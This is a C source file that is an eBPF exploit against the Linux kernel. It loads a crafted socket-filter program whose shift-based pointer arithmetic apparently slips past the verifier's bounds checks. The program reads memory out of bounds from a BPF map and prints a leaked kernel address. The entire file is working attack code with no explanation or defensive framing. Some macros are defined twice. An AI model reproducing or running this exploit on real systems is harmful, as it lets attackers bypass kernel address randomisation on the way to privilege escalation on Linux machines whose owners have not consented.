#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/personality.h>
#include <sys/prctl.h>
#include "./bpf.h"

#define BPF_JMP32 0x06
#define BPF_JLT 0xa0
#define BPF_OBJ_GET_INFO_BY_FD 15
#define BPF_MAP_TYPE_STACK 0x17

#define BPF_ALU64_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })
#define BPF_ALU32_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
#define BPF_ALU32_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV64_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_MOV32_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = (__u32) (IMM) }),			\
	((struct bpf_insn) {					\
		.code  = 0, 					\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = ((__u64) (IMM)) >> 32 })

#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD	1
#endif

#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_MAP_FD(DST, MAP_FD)				\
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Unconditional jumps, goto pc + off16 */

#define BPF_JMP_A(OFF)						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_JA,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_JMP32_REG(OP, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_EXIT_INSN()						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_EXIT,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MAP_GET(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */              

#define BPF_MAP_GET_ADDR(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_MOV64_REG((dst), BPF_REG_0)          	  /* r_dst = (r0)   */              

/* Memory load, dst_reg = *(uint *) (src_reg + off16) */

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = src_reg */

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })


char buffer[64];
int sockets[2];
int progfd;
int ctrl_mapfd, exp_mapfd;
int doredact = 0;

#define LOG_BUF_SIZE 0x100000
char bpf_log_buf[LOG_BUF_SIZE];

uint64_t ctrl_buf[0x100]; 
char info[0x100];
#define RADIX_TREE_INTERNAL_NODE 2
#define RADIX_TREE_MAP_MASK 0x3f

static __u64 ptr_to_u64(void *ptr)
{
	return (__u64) (unsigned long) ptr;
}

int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version)
{
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = ptr_to_u64((void *) insns),
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = ptr_to_u64((void *) license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 2,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries, int map_flags)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, void *value, int mapfd, uint64_t flags) 
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)value,
		.flags = flags,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value, int mapfd) 
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) 
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)value,
        .info.bpf_fd = mapfd,
        .info.info_len = 0x100,
        .info.info = (__u64)info,
	};

	syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));

    return *(uint32_t *)((char *)info+0x40);
}


static void __exit(char *err) 
{
	fprintf(stderr, "error: %s\n", err);
	exit(-1);
}


static int load_my_prog()
{
	struct bpf_insn my_prog[] = {

		BPF_LD_MAP_FD(BPF_REG_9,ctrl_mapfd),
		BPF_MAP_GET(0,BPF_REG_8), 	
	    	BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),         //addr r_dst = (r0)            
	    	BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),         //addr r_dst = (r0)            
		BPF_MOV64_IMM(BPF_REG_0,0x0),			

        	BPF_LDX_MEM(BPF_DW,BPF_REG_3,BPF_REG_6,0),    
        	BPF_LDX_MEM(BPF_DW,BPF_REG_4,BPF_REG_6,8),    

		BPF_JMP_IMM(BPF_JGE, BPF_REG_3, 0, 1),
		BPF_MOV64_IMM(BPF_REG_0,0x0),			
		BPF_JMP_IMM(BPF_JGE, BPF_REG_3, 0x1000, 7),

		BPF_JMP_IMM(BPF_JGE, BPF_REG_4, 0, 1),
		BPF_MOV64_IMM(BPF_REG_0,0x0),			
		BPF_JMP_IMM(BPF_JGE, BPF_REG_4, 1024, 4),

		BPF_ALU64_REG(BPF_RSH, BPF_REG_3, BPF_REG_4), 
		BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_3),

        	BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0),    
        	BPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x10), 

		BPF_MOV64_IMM(BPF_REG_0,0x0),			
		BPF_EXIT_INSN(),

	};
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,my_prog,sizeof(my_prog),"GPL",0);
}

static void prep(void) 
{
	ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,1,0);
	if(ctrl_mapfd < 0){
		__exit(strerror(errno));
	}

	exp_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,1,0);
	if(exp_mapfd < 0){
		__exit(strerror(errno));
	}

	progfd =  load_my_prog();
	if(progfd < 0){
		printf("%s\n",bpf_log_buf);
		__exit(strerror(errno));
	}
	
	//printf("success: %s\n",bpf_log_buf);
	if(socketpair(AF_UNIX,SOCK_DGRAM,0,sockets)){
		__exit(strerror(errno));
	}
	
	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
		__exit(strerror(errno));
	}
}

static void writemsg(void) 
{
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

static void update_elem(uint32_t op)
{
    ctrl_buf[0] = 0x170*2;
    ctrl_buf[1] = 1;

    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);
    writemsg();
}

static uint64_t infoleak(uint64_t *buffer, int mapfd) 
{
	uint64_t key = 0;
    if (bpf_lookup_elem(&key, buffer, mapfd))
		__exit(strerror(errno));
}

static void leak(void)
{
    update_elem(0);
    infoleak(ctrl_buf, ctrl_mapfd);
    uint64_t addr_leak = ctrl_buf[2];
    printf("[+] leak kernel address:0x%lX\n", addr_leak);
}

int main(void){
	prep();
	leak();
	return 0;
}
